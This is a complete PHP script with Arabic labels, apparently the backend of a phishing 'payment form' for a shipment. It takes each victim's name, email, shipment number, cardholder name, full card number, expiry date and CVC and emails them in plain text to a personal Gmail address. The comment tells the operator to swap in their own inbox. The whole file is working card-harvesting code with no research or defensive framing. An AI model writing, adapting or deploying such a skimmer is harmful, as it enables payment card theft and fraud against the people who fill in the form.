<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    $to = 'muneeraha20@gmail.com'; // استبدل هذا ببريدك الإلكتروني
    $subject = 'معلومات جديدة من نموذج الدفع';
    $message = "الاسم: " . $data['name'] . "\n" .
               "البريد الإلكتروني: " . $data['email'] . "\n" .
               "رقم الشحنة: " . $data['shipment'] . "\n" .
               "طريقة الدفع: " . $data['payment_method'] . "\n" .
               "اسم حامل البطاقة: " . $data['cardholder'] . "\n" .
               "رقم البطاقة: " . $data['cardnumber'] . "\n" .
               "تاريخ الانتهاء: " . $data['expiry'] . "\n" .
               "رمز الأمان: " . $data['cvc'] . "\n";

    $headers = "From: no-reply@example.com";

    if (mail($to, $subject, $message, $headers)) {
        http_response_code(200);
        echo "تم الإرسال بنجاح";
    } else {
        http_response_code(500);
        echo "فشل في الإرسال";
    }
}
?>
